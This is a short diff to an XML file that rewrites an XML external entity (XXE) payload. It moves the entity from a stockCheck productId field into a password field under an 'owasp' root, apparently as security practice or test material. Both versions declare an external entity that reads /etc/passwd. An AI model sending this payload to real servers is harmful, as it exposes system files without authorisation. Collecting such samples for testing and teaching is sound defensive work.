@@ -1,3 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/passwd"> ]>
-<stockCheck><productId>&xxe;</productId></stockCheck>
+<!DOCTYPE foo 
+	[ <!ENTITY xxe SYSTEM "/etc/passwd"> ]
+>
+<owasp>
+	<username>HosseinAmini</username>
+	<password>&xxe;</password>
+</owasp>
